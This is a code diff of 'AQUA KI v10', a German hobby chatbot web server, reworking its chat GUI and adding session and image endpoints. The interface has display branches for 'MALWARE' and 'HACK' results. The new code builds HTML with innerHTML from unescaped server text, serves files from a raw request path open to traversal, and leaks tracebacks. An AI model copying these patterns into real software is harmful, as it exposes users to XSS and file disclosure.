+<div class="input-box">
+<textarea id="input" placeholder="Schreib mir..." rows="1" oninput="autoResize(this)" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
+<button id="sendBtn" onclick="send()">SENDEN</button>
 </div>
+</div>
+</div></div>
 <script>
-const chatContainer = document.getElementById('chatContainer');
-const messageInput = document.getElementById('messageInput');
-const typingIndicator = document.getElementById('typingIndicator');
-let sessionId = 'web_' + Date.now();
-
-messageInput.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') sendMessage();
-});
-
-function addMessage(role, content, extra) {
-    const msg = document.createElement('div');
-    msg.className = 'message ' + role;
-    let bubble = document.createElement('div');
-    bubble.className = 'bubble';
-    bubble.textContent = content;
-    msg.appendChild(bubble);
-    
-    if (extra) {
-        const badge = document.createElement('div');
-        badge.className = 'special-badge badge-' + extra;
-        badge.textContent = extra.toUpperCase();
-        msg.appendChild(badge);
-    }
-    
-    const time = document.createElement('div');
-    time.className = 'time';
-    time.textContent = new Date().toLocaleTimeString();
-    msg.appendChild(time);
-    
-    chatContainer.appendChild(msg);
-    chatContainer.scrollTop = chatContainer.scrollHeight;
-}
-
-function sendMessage() {
-    const text = messageInput.value.trim();
-    if (!text) return;
-    
-    addMessage('user', text);
-    messageInput.value = '';
-    typingIndicator.style.display = 'block';
-    
-    fetch('/api/query', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({query: text, session_id: sessionId})
-    })
-    .then(r => r.json())
-    .then(data => {
-        typingIndicator.style.display = 'none';
-        let responseText = data.text || 'Keine Antwort';
-        let extra = null;
-        if (data.type === 'image') extra = 'image';
-        else if (data.type === 'music') extra = 'music';
-        else if (data.type === 'video') extra = 'video';
-        else if (data.type === 'tool') extra = 'tool';
-        addMessage('ai', responseText, extra);
-    })
-    .catch(err => {
-        typingIndicator.style.display = 'none';
-        addMessage('ai', 'Fehler: ' + err.message);
-    });
-}
-
-// Initiale Begrüßung
-window.onload = function() {
-    addMessage('ai', '🤖 **AQUA KI v10** ist bereit!\n\nIch bin eine echte, selbstlernende KI mit:\n• 🎨 Bildgenerierung\n• 🎵 Musikkomposition\n• 🎬 Video/GIF-Erstellung\n• 🔊 Text-to-Speech\n• 🔧 Tool-Bau\n• 💀 Security-Tools\n• 🌐 24/7 GitHub Selbstfütterung\n\n**Was kann ich für dich tun?**');
-};
-</script>
-</body>
-</html>"""
+var sessionId = "session_"+Date.now();
+var generating = false;
+document.addEventListener("DOMContentLoaded",function(){loadStats();setInterval(loadStats,5000);loadSessions();document.getElementById("input").focus();});
+function autoResize(t){t.style.height="auto";t.style.height=Math.min(t.scrollHeight,100)+"px";}
+function send(){var i=document.getElementById("input"),t=i.value.trim();if(!t||generating)return;
+addMsg("user",t);i.value="";i.style.height="auto";generating=true;document.getElementById("sendBtn").disabled=true;
+var x=new XMLHttpRequest();x.open("POST","/api/query",true);x.setRequestHeader("Content-Type","application/json");
+x.onload=function(){try{var d=JSON.parse(x.responseText);displayResult(d)}catch(e){displayResult({text:"Fehler: "+e.message})}
+generating=false;document.getElementById("sendBtn").disabled=false;loadStats();loadSessions()};
+x.onerror=function(){displayResult({text:"Netzwerkfehler"});generating=false;document.getElementById("sendBtn").disabled=false};
+x.send(JSON.stringify({query:t,session_id:sessionId}));}
+function addMsg(r,c){var m=document.getElementById("messages"),d=document.createElement("div");d.className="message "+(r==="user"?"user":"ai");
+var a=document.createElement("div");a.className="avatar "+(r==="user"?"user":"ai");a.textContent=r==="user"?"U":"A";
+var x=document.createElement("div");x.className="msg-content";x.innerHTML='<p>'+c+'</p>';
+d.appendChild(a);d.appendChild(x);m.appendChild(d);m.scrollTop=m.scrollHeight;}
+function displayResult(d){if(d.text){addMsg("assistant",d.text.replace(/\\n/g,'<br>'));}
+else if(d.image){addMsg("assistant",'<p>> BILD GENERIERT</p><img src="'+d.image.path+'">');}
+else if(d.tool){addMsg("assistant",'<p>> TOOL: '+d.tool.name+'</p><pre>'+d.tool.code.substring(0,200)+'</pre>');}
+else if(d.malware){addMsg("assistant",'<p>> MALWARE: '+d.malware.name+'</p>');}
+else if(d.hack){addMsg("assistant",'<p>> HACK: '+d.hack.name+'</p>');}
+else{addMsg("assistant",JSON.stringify(d).substring(0,200));}}
+function loadStats(){var x=new XMLHttpRequest();x.open("GET","/api/status",true);
+x.onload=function(){try{var d=JSON.parse(x.responseText);
+document.getElementById("statsDisplay").textContent="WKZ: "+(d.wissen_repos||0)+"·V:"+(d.vocab||0);
+document.getElementById("opsDisplay").textContent=(d.total_fed||0);}catch(e){}};x.send();}
+function loadSessions(){var x=new XMLHttpRequest();x.open("GET","/api/sessions",true);
+x.onload=function(){try{var d=JSON.parse(x.responseText),l=document.getElementById("chatList"),h="";
+if(d.sessions)for(var i=0;i<Math.min(d.sessions.length,15);i++){var s=d.sessions[i];h+='<div class="chat-item'+(s.id===sessionId?' active':'')+'" onclick="loadSession(\\''+s.id+'\\')">> '+s.name.substring(0,25)+'</div>';}
+l.innerHTML=h||'<div class="chat-item active">> aktuelles_gespräch</div>';}catch(e){}};x.send();}
+function loadSession(id){if(id&&id!=='current'){sessionId=id;var x=new XMLHttpRequest();x.open("GET","/api/history/"+id,true);
+x.onload=function(){try{var d=JSON.parse(x.responseText);document.getElementById("messages").innerHTML="";
+if(d.history)for(var i=0;i<d.history.length;i++){var m=d.history[i];if(m.role==="user"||m.role==="assistant")addMsg(m.role==="user"?"user":"assistant",m.content.substring(0,500));}}catch(e){}loadSessions()};x.send();}}
+function newChat(){sessionId="session_"+Date.now();document.getElementById("messages").innerHTML="";
+addMsg("assistant","Neuer Chat gestartet. 24/7 Selbstfütterung läuft!")}
+</script></body></html>"""
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -1029,35 +1173,30 @@ class Handler(BaseHTTPRequestHandler):
                 self.send_header("Content-Type", "text/html; charset=utf-8")
                 self.send_header("Access-Control-Allow-Origin", "*")
                 self.end_headers()
-                self.wfile.write(GUI_HTML.encode("utf-8"))
+                html = GUI_HTML.replace("{VERSION}", VERSION)
+                self.wfile.write(html.encode("utf-8"))
+            
+            elif path.startswith("/images/"):
+                fp = os.path.join(DATA_DIR, path.lstrip("/"))
+                if os.path.exists(fp):
+                    with open(fp, "rb") as f:
+                        self.send_response(200)
+                        self.send_header("Content-Type", "image/png")
+                        self.send_header("Access-Control-Allow-Origin", "*")
+                        self.end_headers()
+                        self.wfile.write(f.read())
+                else:
+                    self.send_error(404)
+            
             elif path == "/api/status":
                 self._json(self.ai.get_stats())
-            elif path == "/api/feed":
-                try:
-                    with db_lock:
-                        if db_conn:
-                            cur = db_conn.execute("SELECT repo, concepts FROM feed_log ORDER BY id DESC LIMIT 20")
-                            feed = [{"repo": r[0], "concepts": r[1]} for r in cur.fetchall()]
-                        else:
-                            feed = []
-                except:
-                    feed = []
-                self._json({"feed": feed})
-            elif path == "/api/feed/now":
-                if self.ai and self.ai.feeder:
-                    c = self.ai.feeder._feed_random()
-                    self._json({"status": "ok", "fed": c, "total": self.ai.feeder.total_fed})
-                else:
-                    self._json({"error": "not ready"})
-            elif path == "/api/feed/all":
-                if self.ai and self.ai.feeder:
-                    t = threading.Thread(target=self.ai.feeder.feed_all, daemon=True)
-                    t.start()
-                    self._json({"status": "ok", "message": "Fütterung gestartet!"})
-                else:
-                    self._json({"error": "not ready"})
+            elif path == "/api/sessions":
+                self._json({"sessions": db_get_sessions()})
+            elif path.startswith("/api/history/"):
+                sid = path.split("/api/history/")[1]
+                self._json({"history": db_get_history(sid)})
             else:
-                self._json({"error": "NOT_FOUND", "path": path})
+                self._json({"error": "NOT_FOUND"})
         except Exception as e:
             self._json({"error": str(e)})
     
@@ -1079,7 +1218,7 @@ class Handler(BaseHTTPRequestHandler):
             else:
                 self._json({"error": "UNKNOWN_ENDPOINT"})
         except Exception as e:
-            self._json({"error": str(e)})
+            self._json({"error": str(e), "traceback": traceback.format_exc()})
     
     def _json(self, data):
         try:
@@ -1094,93 +1233,78 @@ class Handler(BaseHTTPRequestHandler):
     def log_message(self, fmt, *args):
         print(f"[HTTP] {args[1]} {args[2]}")
 
+def db_get_sessions():
+    global db_conn
+    try:
+        with db_lock:
+            if db_conn:
+                cur = db_conn.execute("SELECT id, name, last_active FROM sessions ORDER BY last_active DESC LIMIT 50")
+                return [{"id": r[0], "name": r[1] or "Chat", "last_active": r[2]} for r in cur.fetchall()]
+    except:
+        pass
+    return []
 
-# ================================================================
-# KONSOLE
-# ================================================================
-def console_mode(ai):
-    print("=" * 60)
-    print("  AQUA KI v10 - KONSOLEN-MODUS")
-    print("  ChatGPT-ähnlich | 24/7 Selbstfütterung")
-    print("=" * 60)
-    print("  exit/bye = Beenden | feed = Fütterung")
-    print("  feed all = Vollständig | stats = Status")
-    print()
-    
-    sid = f"console_{int(time.time())}"
-    
-    while True:
-        try:
-            inp = input("\033[36mDu > \033[0m").strip()
-            if not inp:
-                continue
-            if inp.lower() in ["exit", "quit", "bye", "tschüss"]:
-                print("\033[36mAQUA KI > \033[0mTschüss! Ich lerne weiter... 🤖")
-                break
-            if inp.lower() == "feed":
-                c = ai.feeder._feed_random()
-                print(f"\033[36mAQUA KI > \033[0m+{c} Repos gelernt (Total: {ai.feeder.total_fed})")
-                continue
-            if inp.lower() == "feed all":
-                print("\033[36mAQUA KI > \033[0mStarte Komplett-Fütterung...")
-                ai.feeder.feed_all()
-                continue
-            if inp.lower() == "stats":
-                s = ai.get_stats()
-                for k, v in s.items():
-                    if k != "db":
-                        print(f"  {k}: {v}")
-                continue
-            
-            resp = ai.process(inp, sid)
-            text = resp.get("text", "")
-            print(f"\033[36mAQUA KI > \033[0m{text}")
-            type_ = resp.get("type", "text")
-            if type_ != "text":
-                print(f"  [{type_.upper()}] {resp.get(type_, {})}")
-            print()
-        except KeyboardInterrupt:
-            print("\n\033[36mAQUA KI > \033[0mBis dann!")
-            break
-        except Exception as e:
-            print(f"[FEHLER] {e}")
+def db_get_history(sid, limit=50):
+    global db_conn
+    try:
+        with db_lock:
+            if db_conn:
+                cur = db_conn.execute("SELECT role, content FROM messages WHERE session_id=? ORDER BY id ASC LIMIT ?", (sid, limit))
+                return [{"role": r[0], "content": r[1]} for r in cur.fetchall()]
+    except:
+        pass
+    return []
 
 
 # ================================================================
-# ENTRY POINT
+# MAIN
 # ================================================================
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser()
-    parser.add_argument("--server", action="store_true")
+    parser.add_argument("--server", action="store_true", help="Server mode")
     parser.add_argument("--port", type=int, default=PORT)
     args = parser.parse_args()
+    
+    print(f"\n{'='*60}")
+    print(f"  AQUA KI v{VERSION} - START")
+    print(f"{'='*60}")
     
     ai = AquaAI()
     
     if args.server or "RAILWAY" in os.environ or "PORT" in os.environ:
-        port = args.port or int(os.environ.get("PORT", 8080))
-        print(f"\n[WEB MODE] http://0.0.0.0:{port}")
-        print("[WEB MODE] Graues GUI mit AQUA KI Design")
+        port = args.port or int(os.environ.get("PORT", 8000))
+        print(f"\n  Server: http://0.0.0.0:{port}")
+        print(f"  Graue GUI mit 24/7 Selbstfütterung!")
+        print(f"  Bilder: /images/ | Tools: /api/query")
+        
         Handler.ai = ai
         
         for attempt in range(3):
             try:
                 server = HTTPServer(("0.0.0.0", port), Handler)
-                print(f"Server: http://0.0.0.0:{port}")
+                print(f"  Server läuft auf Port {port}")
                 server.serve_forever()
             except OSError as e:
                 if "Address already in use" in str(e) and attempt < 2:
                     port += 1
-                    print(f"Port belegt, versuche {port}...")
+                    print(f"  Port belegt, versuche {port}...")
                     time.sleep(2)
                 else:
-                    print(f"FATAL: {e}")
+                    print(f"  FATAL: {e}")
                     sys.exit(1)
             except KeyboardInterrupt:
-                print("\nServer stopp...")
+                print("\n  Server gestoppt")
                 if ai.feeder:
                     ai.feeder.stop()
                 sys.exit(0)
     else:
-        console_mode(ai)
+        print(f"\n  Server: http://0.0.0.0:{PORT}")
+        print(f"  Öffne im Browser!")
+        Handler.ai = ai
+        server = HTTPServer(("0.0.0.0", PORT), Handler)
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            print("\n  Gestoppt")
+            ai.feeder.stop()
